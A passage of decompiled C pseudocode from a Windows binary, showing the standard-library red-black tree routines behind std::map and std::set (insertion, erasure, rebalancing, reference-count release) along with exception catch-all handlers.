        cVar2 = *(char *)((int)piVar6 + 0xd);
        piVar3 = piVar4;
      }
      *(int **)(*param_1 + 8) = piVar3;
    }
    else {
      *(int **)(*param_1 + 8) = piVar7;
    }
  }
  if ((char)param_3[3] == '\x01') {
    if (piVar8 != *(int **)(*param_1 + 4)) {
      do {
        piVar6 = piVar7;
        if ((char)piVar8[3] != '\x01') break;
        piVar7 = (int *)*piVar6;
        if (piVar8 == piVar7) {
          piVar7 = (int *)piVar6[2];
          if ((char)piVar7[3] == '\0') {
            *(undefined1 *)(piVar7 + 3) = 1;
            *(undefined1 *)(piVar6 + 3) = 0;
            FUN_10017780(piVar6);
            piVar7 = (int *)piVar6[2];
          }
          if (*(char *)((int)piVar7 + 0xd) == '\0') {
            if ((*(char *)(*piVar7 + 0xc) != '\x01') || (*(char *)(piVar7[2] + 0xc) != '\x01')) {
              if (*(char *)(piVar7[2] + 0xc) == '\x01') {
                *(undefined1 *)(*piVar7 + 0xc) = 1;
                *(undefined1 *)(piVar7 + 3) = 0;
                FUN_100177e0(piVar7);
                piVar7 = (int *)piVar6[2];
              }
              *(char *)(piVar7 + 3) = (char)piVar6[3];
              *(undefined1 *)(piVar6 + 3) = 1;
              *(undefined1 *)(piVar7[2] + 0xc) = 1;
              FUN_10017780(piVar6);
              break;
            }
LAB_1001d69f:
            *(undefined1 *)(piVar7 + 3) = 0;
          }
        }
        else {
          if ((char)piVar7[3] == '\0') {
            *(undefined1 *)(piVar7 + 3) = 1;
            *(undefined1 *)(piVar6 + 3) = 0;
            FUN_100177e0(piVar6);
            piVar7 = (int *)*piVar6;
          }
          if (*(char *)((int)piVar7 + 0xd) == '\0') {
            if ((*(char *)(piVar7[2] + 0xc) == '\x01') && (*(char *)(*piVar7 + 0xc) == '\x01'))
            goto LAB_1001d69f;
            if (*(char *)(*piVar7 + 0xc) == '\x01') {
              *(undefined1 *)(piVar7[2] + 0xc) = 1;
              *(undefined1 *)(piVar7 + 3) = 0;
              FUN_10017780(piVar7);
              piVar7 = (int *)*piVar6;
            }
            *(char *)(piVar7 + 3) = (char)piVar6[3];
            *(undefined1 *)(piVar6 + 3) = 1;
            *(undefined1 *)(*piVar7 + 0xc) = 1;
            FUN_100177e0(piVar6);
            break;
          }
        }
        piVar7 = (int *)piVar6[1];
        piVar8 = piVar6;
      } while (piVar6 != *(int **)(*param_1 + 4));
    }
    *(undefined1 *)(piVar8 + 3) = 1;
  }
  piVar8 = (int *)param_3[4];
  if (piVar8 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar8;
    *piVar8 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar8);
    }
  }
  thunk_FUN_100579ee(param_3);
  if (param_1[1] != 0) {
    param_1[1] = param_1[1] + -1;
  }
  *param_2 = param_3;
  return;
}



/* Function: FUN_1001d740 */

/* WARNING: Removing unreachable block (ram,0x1001d807) */
/* WARNING: Removing unreachable block (ram,0x1001d817) */
/* WARNING: Removing unreachable block (ram,0x1001d820) */
/* WARNING: Removing unreachable block (ram,0x1001d823) */
/* WARNING: Removing unreachable block (ram,0x1001d813) */
/* WARNING: Removing unreachable block (ram,0x1001d831) */
/* WARNING: Removing unreachable block (ram,0x1001d83d) */
/* WARNING: Removing unreachable block (ram,0x1001d848) */
/* WARNING: Removing unreachable block (ram,0x1001d844) */
/* WARNING: Removing unreachable block (ram,0x1001d838) */
/* WARNING: Removing unreachable block (ram,0x1001d84b) */

void __thiscall FUN_1001d740(int *param_1,undefined4 *param_2,int *param_3)

{
  int iVar1;
  char cVar2;
  int *piVar3;
  int *piVar4;
  undefined4 *puVar5;
  int *piVar6;
  int *piVar7;
  int *piVar8;
  
  FUN_10017870();
  piVar8 = (int *)*param_3;
  if (*(char *)((int)piVar8 + 0xd) == '\0') {
    if (*(char *)(param_3[2] + 0xd) == '\0') {
      piVar8 = (int *)param_3[2];
    }
  }
  else {
    piVar8 = (int *)param_3[2];
  }
  piVar7 = (int *)param_3[1];
  if (*(char *)((int)piVar8 + 0xd) == '\0') {
    piVar8[1] = (int)piVar7;
  }
  if (*(int **)(*param_1 + 4) == param_3) {
    *(int **)(*param_1 + 4) = piVar8;
  }
  else if ((int *)*piVar7 == param_3) {
    *piVar7 = (int)piVar8;
  }
  else {
    piVar7[2] = (int)piVar8;
  }
  puVar5 = (undefined4 *)*param_1;
  if ((int *)*puVar5 == param_3) {
    piVar6 = piVar7;
    if (*(char *)((int)piVar8 + 0xd) == '\0') {
      cVar2 = *(char *)(*piVar8 + 0xd);
      piVar3 = (int *)*piVar8;
      piVar6 = piVar8;
      while (piVar4 = piVar3, cVar2 == '\0') {
        piVar3 = (int *)*piVar4;
        cVar2 = *(char *)((int)piVar3 + 0xd);
        piVar6 = piVar4;
      }
      puVar5 = (undefined4 *)*param_1;
    }
    *puVar5 = piVar6;
  }
  if (*(int **)(*param_1 + 8) == param_3) {
    if (*(char *)((int)piVar8 + 0xd) == '\0') {
      cVar2 = *(char *)(piVar8[2] + 0xd);
      piVar6 = (int *)piVar8[2];
      piVar3 = piVar8;
      while (piVar4 = piVar6, cVar2 == '\0') {
        piVar6 = (int *)piVar4[2];
        cVar2 = *(char *)((int)piVar6 + 0xd);
        piVar3 = piVar4;
      }
      *(int **)(*param_1 + 8) = piVar3;
    }
    else {
      *(int **)(*param_1 + 8) = piVar7;
    }
  }
  if ((char)param_3[3] == '\x01') {
    if (piVar8 != *(int **)(*param_1 + 4)) {
      do {
        piVar6 = piVar7;
        if ((char)piVar8[3] != '\x01') break;
        piVar7 = (int *)*piVar6;
        if (piVar8 == piVar7) {
          piVar7 = (int *)piVar6[2];
          if ((char)piVar7[3] == '\0') {
            *(undefined1 *)(piVar7 + 3) = 1;
            *(undefined1 *)(piVar6 + 3) = 0;
            FUN_10017780(piVar6);
            piVar7 = (int *)piVar6[2];
          }
          if (*(char *)((int)piVar7 + 0xd) == '\0') {
            if ((*(char *)(*piVar7 + 0xc) != '\x01') || (*(char *)(piVar7[2] + 0xc) != '\x01')) {
              if (*(char *)(piVar7[2] + 0xc) == '\x01') {
                *(undefined1 *)(*piVar7 + 0xc) = 1;
                *(undefined1 *)(piVar7 + 3) = 0;
                FUN_100177e0(piVar7);
                piVar7 = (int *)piVar6[2];
              }
              *(char *)(piVar7 + 3) = (char)piVar6[3];
              *(undefined1 *)(piVar6 + 3) = 1;
              *(undefined1 *)(piVar7[2] + 0xc) = 1;
              FUN_10017780(piVar6);
              break;
            }
LAB_1001d92f:
            *(undefined1 *)(piVar7 + 3) = 0;
          }
        }
        else {
          if ((char)piVar7[3] == '\0') {
            *(undefined1 *)(piVar7 + 3) = 1;
            *(undefined1 *)(piVar6 + 3) = 0;
            FUN_100177e0(piVar6);
            piVar7 = (int *)*piVar6;
          }
          if (*(char *)((int)piVar7 + 0xd) == '\0') {
            if ((*(char *)(piVar7[2] + 0xc) == '\x01') && (*(char *)(*piVar7 + 0xc) == '\x01'))
            goto LAB_1001d92f;
            if (*(char *)(*piVar7 + 0xc) == '\x01') {
              *(undefined1 *)(piVar7[2] + 0xc) = 1;
              *(undefined1 *)(piVar7 + 3) = 0;
              FUN_10017780(piVar7);
              piVar7 = (int *)*piVar6;
            }
            *(char *)(piVar7 + 3) = (char)piVar6[3];
            *(undefined1 *)(piVar6 + 3) = 1;
            *(undefined1 *)(*piVar7 + 0xc) = 1;
            FUN_100177e0(piVar6);
            break;
          }
        }
        piVar7 = (int *)piVar6[1];
        piVar8 = piVar6;
      } while (piVar6 != *(int **)(*param_1 + 4));
    }
    *(undefined1 *)(piVar8 + 3) = 1;
  }
  piVar8 = (int *)param_3[5];
  if (piVar8 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar8;
    *piVar8 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar8);
    }
  }
  piVar8 = (int *)param_3[4];
  if (piVar8 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar8;
    *piVar8 = *piVar8 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar8);
    }
  }
  thunk_FUN_100579ee(param_3);
  if (param_1[1] != 0) {
    param_1[1] = param_1[1] + -1;
  }
  *param_2 = param_3;
  return;
}



/* Function: FUN_1001d9e0 */

void FUN_1001d9e0(int *param_1)

{
  int iVar1;
  char cVar2;
  int *piVar3;
  int *piVar4;
  
  cVar2 = *(char *)((int)param_1 + 0xd);
  while (cVar2 == '\0') {
    FUN_1001d9e0(param_1[2]);
    piVar3 = (int *)param_1[4];
    piVar4 = (int *)*param_1;
    if (piVar3 != (int *)0x0) {
      LOCK();
      iVar1 = *piVar3;
      *piVar3 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(piVar3);
      }
    }
    thunk_FUN_100579ee(param_1);
    param_1 = piVar4;
    cVar2 = *(char *)((int)piVar4 + 0xd);
  }
  return;
}



/* Function: FUN_1001da30 */

void FUN_1001da30(int *param_1)

{
  int iVar1;
  char cVar2;
  int *piVar3;
  int *piVar4;
  
  cVar2 = *(char *)((int)param_1 + 0xd);
  while (cVar2 == '\0') {
    FUN_1001da30(param_1[2]);
    piVar3 = (int *)param_1[5];
    piVar4 = (int *)*param_1;
    if (piVar3 != (int *)0x0) {
      LOCK();
      iVar1 = *piVar3;
      *piVar3 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(piVar3);
      }
    }
    piVar3 = (int *)param_1[4];
    if (piVar3 != (int *)0x0) {
      LOCK();
      iVar1 = *piVar3;
      *piVar3 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(piVar3);
      }
    }
    thunk_FUN_100579ee(param_1);
    param_1 = piVar4;
    cVar2 = *(char *)((int)piVar4 + 0xd);
  }
  return;
}



/* Function: FUN_1001daa0 */

int FUN_1001daa0(undefined4 param_1,undefined4 *param_2)

{
  int *piVar1;
  int iVar2;
  
  iVar2 = FUN_10018140();
  *(undefined2 *)(iVar2 + 0xc) = 0;
  if ((undefined4 *)(iVar2 + 0x10) != (undefined4 *)0x0) {
    piVar1 = *(int **)*param_2;
    *(undefined4 *)(iVar2 + 0x10) = piVar1;
    if (piVar1 != (int *)0x0) {
      LOCK();
      *piVar1 = *piVar1 + 1;
      UNLOCK();
    }
    *(undefined4 *)(iVar2 + 0x14) = 0;
  }
  return iVar2;
}



/* Function: FUN_1001dae0 */

undefined4 * __thiscall
FUN_1001dae0(undefined4 *param_1,undefined4 *param_2,int *param_3,undefined4 param_4,
            undefined4 param_5)

{
  int *piVar1;
  int iVar2;
  int *piVar3;
  char cVar4;
  undefined4 *puVar5;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined4 extraout_ECX_03;
  undefined4 extraout_ECX_04;
  undefined4 uVar6;
  uint uStack_30;
  undefined1 auStack_1c [4];
  int *local_18;
  undefined1 *local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10075440;
  local_10 = ExceptionList;
  uStack_30 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  local_14 = (undefined1 *)&uStack_30;
  ExceptionList = &local_10;
  local_8 = 0;
  if (param_1[1] == 0) {
    local_14 = (undefined1 *)&uStack_30;
    FUN_1001dfe0(param_2,1,*param_1,param_1,param_5);
    ExceptionList = local_10;
    return param_2;
  }
  piVar1 = (int *)*param_1;
  if (param_3 == (int *)*piVar1) {
    local_14 = (undefined1 *)&uStack_30;
    cVar4 = FUN_1001d1f0(param_4,param_3 + 4);
    uVar6 = extraout_ECX;
    if (cVar4 != '\0') {
      FUN_1001dfe0(param_2,1,param_3,extraout_ECX,param_5);
      ExceptionList = local_10;
      return param_2;
    }
  }
  else if (param_3 == piVar1) {
    iVar2 = piVar1[2];
    local_14 = (undefined1 *)&uStack_30;
    cVar4 = FUN_1001d1f0(iVar2 + 0x10,param_4);
    uVar6 = extraout_ECX_00;
    if (cVar4 != '\0') {
      FUN_1001dfe0(param_2,0,iVar2,extraout_ECX_00,param_5);
      ExceptionList = local_10;
      return param_2;
    }
  }
  else {
    cVar4 = FUN_1001d1f0(param_4,param_3 + 4);
    if (cVar4 != '\0') {
      local_18 = param_3;
      FUN_10018180();
      piVar3 = local_18;
      cVar4 = FUN_1001d1f0(local_18 + 4,param_4);
      if (cVar4 != '\0') {
        if (*(char *)(piVar3[2] + 0xd) == '\0') {
          FUN_1001dfe0(param_2,1,param_3,extraout_ECX_01,param_5);
          ExceptionList = local_10;
          return param_2;
        }
        FUN_1001dfe0(param_2,0,piVar3,extraout_ECX_01,param_5);
        ExceptionList = local_10;
        return param_2;
      }
    }
    cVar4 = FUN_1001d1f0(param_3 + 4,param_4);
    uVar6 = extraout_ECX_02;
    if (cVar4 != '\0') {
      local_18 = param_3;
      FUN_10017870();
      piVar3 = local_18;
      uVar6 = extraout_ECX_03;
      if ((local_18 == piVar1) ||
         (cVar4 = FUN_1001d1f0(param_4,local_18 + 4), uVar6 = extraout_ECX_04, cVar4 != '\0')) {
        if (*(char *)(param_3[2] + 0xd) == '\0') {
          FUN_1001dfe0(param_2,1,piVar3,uVar6,param_5);
          ExceptionList = local_10;
          return param_2;
        }
        FUN_1001dfe0(param_2,0,param_3,uVar6,param_5);
        ExceptionList = local_10;
        return param_2;
      }
    }
  }
  local_8 = 0xffffffff;
  puVar5 = (undefined4 *)FUN_1001e210(auStack_1c,uVar6,param_4,param_5);
  *param_2 = *puVar5;
  ExceptionList = local_10;
  return param_2;
}



/* Function: Catch_All@1001dcd8 */

void Catch_All_1001dcd8(void)

{
  undefined4 *puVar1;
  undefined4 extraout_ECX;
  int unaff_EBP;
  
  FUN_1001df60(*(undefined4 *)(unaff_EBP + 0x14));
  FUN_1005de1b(0,0);
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  puVar1 = (undefined4 *)
           FUN_1001e210(unaff_EBP + -0x18,extraout_ECX,*(undefined4 *)(unaff_EBP + 0x10),
                        *(undefined4 *)(unaff_EBP + 0x14));
  **(undefined4 **)(unaff_EBP + 8) = *puVar1;
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return;
}



/* Function: FUN_1001dd20 */

undefined4 * __thiscall
FUN_1001dd20(undefined4 *param_1,undefined4 *param_2,int *param_3,undefined4 param_4,
            undefined4 param_5)

{
  int *piVar1;
  int iVar2;
  int *piVar3;
  char cVar4;
  undefined4 *puVar5;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined4 extraout_ECX_03;
  undefined4 extraout_ECX_04;
  undefined4 uVar6;
  uint uStack_30;
  undefined1 auStack_1c [4];
  int *local_18;
  undefined1 *local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10075460;
  local_10 = ExceptionList;
  uStack_30 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  local_14 = (undefined1 *)&uStack_30;
  ExceptionList = &local_10;
  local_8 = 0;
  if (param_1[1] == 0) {
    local_14 = (undefined1 *)&uStack_30;
    FUN_1001e3b0(param_2,1,*param_1,param_1,param_5);
    ExceptionList = local_10;
    return param_2;
  }
  piVar1 = (int *)*param_1;
  if (param_3 == (int *)*piVar1) {
    local_14 = (undefined1 *)&uStack_30;
    cVar4 = FUN_1001d1f0(param_4,param_3 + 4);
    uVar6 = extraout_ECX;
    if (cVar4 != '\0') {
      FUN_1001e3b0(param_2,1,param_3,extraout_ECX,param_5);
      ExceptionList = local_10;
      return param_2;
    }
  }
  else if (param_3 == piVar1) {
    iVar2 = piVar1[2];
    local_14 = (undefined1 *)&uStack_30;
    cVar4 = FUN_1001d1f0(iVar2 + 0x10,param_4);
    uVar6 = extraout_ECX_00;
    if (cVar4 != '\0') {
      FUN_1001e3b0(param_2,0,iVar2,extraout_ECX_00,param_5);
      ExceptionList = local_10;
      return param_2;
    }
  }
  else {
    cVar4 = FUN_1001d1f0(param_4,param_3 + 4);
    if (cVar4 != '\0') {
      local_18 = param_3;
      FUN_10018180();
      piVar3 = local_18;
      cVar4 = FUN_1001d1f0(local_18 + 4,param_4);
      if (cVar4 != '\0') {
        if (*(char *)(piVar3[2] + 0xd) == '\0') {
          FUN_1001e3b0(param_2,1,param_3,extraout_ECX_01,param_5);
          ExceptionList = local_10;
          return param_2;
        }
        FUN_1001e3b0(param_2,0,piVar3,extraout_ECX_01,param_5);
        ExceptionList = local_10;
        return param_2;
      }
    }
    cVar4 = FUN_1001d1f0(param_3 + 4,param_4);
    uVar6 = extraout_ECX_02;
    if (cVar4 != '\0') {
      local_18 = param_3;
      FUN_10017870();
      piVar3 = local_18;
      uVar6 = extraout_ECX_03;
      if ((local_18 == piVar1) ||
         (cVar4 = FUN_1001d1f0(param_4,local_18 + 4), uVar6 = extraout_ECX_04, cVar4 != '\0')) {
        if (*(char *)(param_3[2] + 0xd) == '\0') {
          FUN_1001e3b0(param_2,1,piVar3,uVar6,param_5);
          ExceptionList = local_10;
          return param_2;
        }
        FUN_1001e3b0(param_2,0,param_3,uVar6,param_5);
        ExceptionList = local_10;
        return param_2;
      }
    }
  }
  local_8 = 0xffffffff;
  puVar5 = (undefined4 *)FUN_1001e600(auStack_1c,uVar6,param_4,param_5);
  *param_2 = *puVar5;
  ExceptionList = local_10;
  return param_2;
}



/* Function: Catch_All@1001df18 */

void Catch_All_1001df18(void)

{
  undefined4 *puVar1;
  undefined4 extraout_ECX;
  int unaff_EBP;
  
  FUN_1001df90(*(undefined4 *)(unaff_EBP + 0x14));
  FUN_1005de1b(0,0);
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  puVar1 = (undefined4 *)
           FUN_1001e600(unaff_EBP + -0x18,extraout_ECX,*(undefined4 *)(unaff_EBP + 0x10),
                        *(undefined4 *)(unaff_EBP + 0x14));
  **(undefined4 **)(unaff_EBP + 8) = *puVar1;
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return;
}



/* Function: FUN_1001df60 */

void FUN_1001df60(int param_1)

{
  int iVar1;
  int *piVar2;
  
  piVar2 = *(int **)(param_1 + 0x10);
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  thunk_FUN_100579ee(param_1);
  return;
}



/* Function: FUN_1001df90 */

void FUN_1001df90(int param_1)

{
  int iVar1;
  int *piVar2;
  
  piVar2 = *(int **)(param_1 + 0x14);
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = *(int **)(param_1 + 0x10);
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = *piVar2 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  thunk_FUN_100579ee(param_1);
  return;
}



/* Function: FUN_1001dfe0 */

void __thiscall
FUN_1001dfe0(int *param_1,undefined4 *param_2,char param_3,undefined4 *param_4,undefined4 param_5,
            int *param_6)

{
  int iVar1;
  char cVar2;
  int *piVar3;
  code *pcVar4;
  int *piVar5;
  int *piVar6;
  int *piVar7;
  
  if (0xaaaaaa8 < (uint)param_1[1]) {
    piVar5 = (int *)param_6[4];
    if (piVar5 != (int *)0x0) {
      LOCK();
      iVar1 = *piVar5;
      *piVar5 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(piVar5);
      }
    }
    thunk_FUN_100579ee(param_6);
    FUN_10056a6a("map/set<T> too long");
    pcVar4 = (code *)swi(3);
    (*pcVar4)();
    return;
  }
  param_1[1] = param_1[1] + 1;
  param_6[1] = (int)param_4;
  if (param_4 == (undefined4 *)*param_1) {
    ((undefined4 *)*param_1)[1] = param_6;
    *(int **)*param_1 = param_6;
    *(int **)(*param_1 + 8) = param_6;
  }
  else if (param_3 == '\0') {
    param_4[2] = param_6;
    if (param_4 == *(undefined4 **)(*param_1 + 8)) {
      *(int **)(*param_1 + 8) = param_6;
    }
  }
  else {
    *param_4 = param_6;
    if (param_4 == *(undefined4 **)*param_1) {
      *(int **)*param_1 = param_6;
    }
  }
  cVar2 = *(char *)(param_6[1] + 0xc);
  piVar5 = param_6;
  do {
    if (cVar2 != '\0') {
      *(undefined1 *)(*(int *)(*param_1 + 4) + 0xc) = 1;
      *param_2 = param_6;
      return;
    }
    piVar7 = (int *)piVar5[1];
    piVar6 = *(int **)piVar7[1];
    if (piVar7 == piVar6) {
      piVar6 = (int *)((undefined4 *)piVar7[1])[2];
      if ((char)piVar6[3] == '\0') goto LAB_1001e122;
      if (piVar5 == (int *)piVar7[2]) {
        piVar5 = (int *)piVar7[2];
        piVar7[2] = *piVar5;
        if (*(char *)(*piVar5 + 0xd) == '\0') {
          *(int **)(*piVar5 + 4) = piVar7;
        }
        piVar5[1] = piVar7[1];
        if (piVar7 == *(int **)(*param_1 + 4)) {
          *(int **)(*param_1 + 4) = piVar5;
        }
        else {
          piVar6 = (int *)piVar7[1];
          if (piVar7 == (int *)*piVar6) {
            *piVar6 = (int)piVar5;
          }
          else {
            piVar6[2] = (int)piVar5;
          }
        }
        *piVar5 = (int)piVar7;
        piVar7[1] = (int)piVar5;
        piVar5 = piVar7;
      }
      *(undefined1 *)(piVar5[1] + 0xc) = 1;
      *(undefined1 *)(*(int *)(piVar5[1] + 4) + 0xc) = 0;
      piVar7 = *(int **)(piVar5[1] + 4);
      piVar6 = (int *)*piVar7;
      *piVar7 = piVar6[2];
      if (*(char *)(piVar6[2] + 0xd) == '\0') {
        *(int **)(piVar6[2] + 4) = piVar7;
      }
      piVar6[1] = piVar7[1];
      if (piVar7 == *(int **)(*param_1 + 4)) {
        *(int **)(*param_1 + 4) = piVar6;
        piVar6[2] = (int)piVar7;
      }
      else {
        piVar3 = (int *)piVar7[1];
        if (piVar7 == (int *)piVar3[2]) {
          piVar3[2] = (int)piVar6;
          piVar6[2] = (int)piVar7;
        }
        else {
          *piVar3 = (int)piVar6;
          piVar6[2] = (int)piVar7;
        }
      }
LAB_1001e1cb:
      piVar7[1] = (int)piVar6;
    }
    else {
      if ((char)piVar6[3] != '\0') {
        if (piVar5 == (int *)*piVar7) {
          iVar1 = *piVar7;
          *piVar7 = *(int *)(iVar1 + 8);
          if (*(char *)(*(int *)(iVar1 + 8) + 0xd) == '\0') {
            *(int **)(*(int *)(iVar1 + 8) + 4) = piVar7;
          }
          *(int *)(iVar1 + 4) = piVar7[1];
          if (piVar7 == *(int **)(*param_1 + 4)) {
            *(int *)(*param_1 + 4) = iVar1;
          }
          else {
            piVar5 = (int *)piVar7[1];
            if (piVar7 == (int *)piVar5[2]) {
              piVar5[2] = iVar1;
            }
            else {
              *piVar5 = iVar1;
            }
          }
          *(int **)(iVar1 + 8) = piVar7;
          piVar7[1] = iVar1;
          piVar5 = piVar7;
        }
        *(undefined1 *)(piVar5[1] + 0xc) = 1;
        *(undefined1 *)(*(int *)(piVar5[1] + 4) + 0xc) = 0;
        piVar7 = *(int **)(piVar5[1] + 4);
        piVar6 = (int *)piVar7[2];
        piVar7[2] = *piVar6;
        if (*(char *)(*piVar6 + 0xd) == '\0') {
          *(int **)(*piVar6 + 4) = piVar7;
        }
        piVar6[1] = piVar7[1];
        if (piVar7 == *(int **)(*param_1 + 4)) {
          *(int **)(*param_1 + 4) = piVar6;
        }
        else {
          piVar3 = (int *)piVar7[1];
          if (piVar7 == (int *)*piVar3) {
            *piVar3 = (int)piVar6;
          }
          else {
            piVar3[2] = (int)piVar6;
          }
        }
        *piVar6 = (int)piVar7;
        goto LAB_1001e1cb;
      }
LAB_1001e122:
      *(undefined1 *)(piVar7 + 3) = 1;
      *(undefined1 *)(piVar6 + 3) = 1;
      *(undefined1 *)(*(int *)(piVar5[1] + 4) + 0xc) = 0;
      piVar5 = *(int **)(piVar5[1] + 4);
    }
    cVar2 = *(char *)(piVar5[1] + 0xc);
  } while( true );
}



/* Function: FUN_1001e210 */

void __thiscall
FUN_1001e210(undefined4 *param_1,undefined4 *param_2,undefined4 param_3,int *param_4,int param_5)

{
  int iVar1;
  ushort uVar2;
  int iVar3;
  char cVar4;
  undefined **ppuVar5;
  uint uVar6;
  undefined4 *puVar7;
  undefined **ppuVar8;
  int *extraout_ECX;
  undefined **ppuVar9;
  int *piVar10;
  int *piVar11;
  bool bVar12;
  int *piVar13;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10075480;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  local_8 = 0;
  piVar13 = (int *)*param_1;
  bVar12 = true;
  piVar10 = piVar13;
  if (*(char *)(piVar13[1] + 0xd) == '\0') {
    piVar11 = (int *)piVar13[1];
    do {
      piVar10 = piVar11;
      iVar3 = piVar10[4];
      if ((iVar3 == 0) || (*(int *)(iVar3 + 8) == 0)) {
        ppuVar9 = &PTR_10083554;
      }
      else if (iVar3 == 0) {
        ppuVar9 = (undefined **)0x0;
      }
      else {
        ppuVar9 = (undefined **)(iVar3 + 0xc);
      }
      if (*param_4 == 0) {
        ppuVar5 = (undefined **)0x0;
      }
      else {
        ppuVar5 = (undefined **)(*param_4 + 0xc);
      }
      ppuVar8 = &PTR_10083554;
      if (ppuVar5 != (undefined **)0x0) {
        ppuVar8 = ppuVar5;
      }
      ppuVar5 = &PTR_10083554;
      if (ppuVar9 != (undefined **)0x0) {
        ppuVar5 = ppuVar9;
      }
      do {
        uVar2 = *(ushort *)ppuVar8;
        bVar12 = uVar2 < *(ushort *)ppuVar5;
        if (uVar2 != *(ushort *)ppuVar5) {
LAB_1001e2cb:
          uVar6 = -(uint)bVar12 | 1;
          goto LAB_1001e2d0;
        }
        if (uVar2 == 0) break;
        uVar2 = *(ushort *)((int)ppuVar8 + 2);
        bVar12 = uVar2 < *(ushort *)((int)ppuVar5 + 2);
        if (uVar2 != *(ushort *)((int)ppuVar5 + 2)) goto LAB_1001e2cb;
        ppuVar8 = ppuVar8 + 1;
        ppuVar5 = ppuVar5 + 1;
      } while (uVar2 != 0);
      uVar6 = 0;
LAB_1001e2d0:
      bVar12 = (int)uVar6 < 0;
      if (bVar12) {
        piVar11 = (int *)*piVar10;
      }
      else {
        piVar11 = (int *)piVar10[2];
      }
    } while (*(char *)((int)piVar11 + 0xd) == '\0');
  }
  if (bVar12) {
    if (piVar10 == (int *)*piVar13) {
      bVar12 = true;
      goto LAB_1001e307;
    }
    FUN_10018180();
  }
  cVar4 = FUN_1001d1f0(piVar10 + 4,param_4);
  iVar3 = param_5;
  piVar13 = extraout_ECX;
  if (cVar4 == '\0') {
    piVar13 = *(int **)(param_5 + 0x10);
    if (piVar13 != (int *)0x0) {
      LOCK();
      iVar1 = *piVar13;
      *piVar13 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(piVar13);
      }
    }
    thunk_FUN_100579ee(iVar3);
    *param_2 = piVar10;
    *(undefined1 *)(param_2 + 1) = 0;
    ExceptionList = local_10;
    return;
  }
LAB_1001e307:
  puVar7 = (undefined4 *)FUN_1001dfe0(&param_4,bVar12,piVar10,piVar13,param_5);
  *param_2 = *puVar7;
  *(undefined1 *)(param_2 + 1) = 1;
  ExceptionList = local_10;
  return;
}



/* Function: Catch_All@1001e356 */

void Catch_All_1001e356(void)

{
  int iVar1;
  int iVar2;
  int *piVar3;
  undefined4 *puVar4;
  int unaff_EBP;
  undefined4 unaff_ESI;
  
  FUN_1001df60(*(undefined4 *)(unaff_EBP + 0x14));
  FUN_1005de1b(0,0);
  iVar2 = *(int *)(unaff_EBP + 0x14);
  piVar3 = *(int **)(iVar2 + 0x10);
  if (piVar3 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar3;
    *piVar3 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar3);
    }
  }
  thunk_FUN_100579ee(iVar2);
  puVar4 = *(undefined4 **)(unaff_EBP + 8);
  *puVar4 = unaff_ESI;
  *(undefined1 *)(puVar4 + 1) = 0;
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return;
}



/* Function: FUN_1001e3b0 */

void __thiscall
FUN_1001e3b0(int *param_1,undefined4 *param_2,char param_3,undefined4 *param_4,undefined4 param_5,
            int *param_6)

{
  int iVar1;
  char cVar2;
  int *piVar3;
  code *pcVar4;
  int *piVar5;
  int *piVar6;
  int *piVar7;
  
  if (0xaaaaaa8 < (uint)param_1[1]) {
    piVar5 = (int *)param_6[5];
    if (piVar5 != (int *)0x0) {
      LOCK();
      iVar1 = *piVar5;
      *piVar5 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(piVar5);
      }
    }
    piVar5 = (int *)param_6[4];
    if (piVar5 != (int *)0x0) {
      LOCK();
      iVar1 = *piVar5;
      *piVar5 = *piVar5 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(piVar5);
      }
    }
    thunk_FUN_100579ee(param_6);
    FUN_10056a6a("map/set<T> too long");
    pcVar4 = (code *)swi(3);
    (*pcVar4)();
    return;
  }
  param_1[1] = param_1[1] + 1;
  param_6[1] = (int)param_4;
  if (param_4 == (undefined4 *)*param_1) {
    ((undefined4 *)*param_1)[1] = param_6;
    *(int **)*param_1 = param_6;
    *(int **)(*param_1 + 8) = param_6;
  }
  else if (param_3 == '\0') {
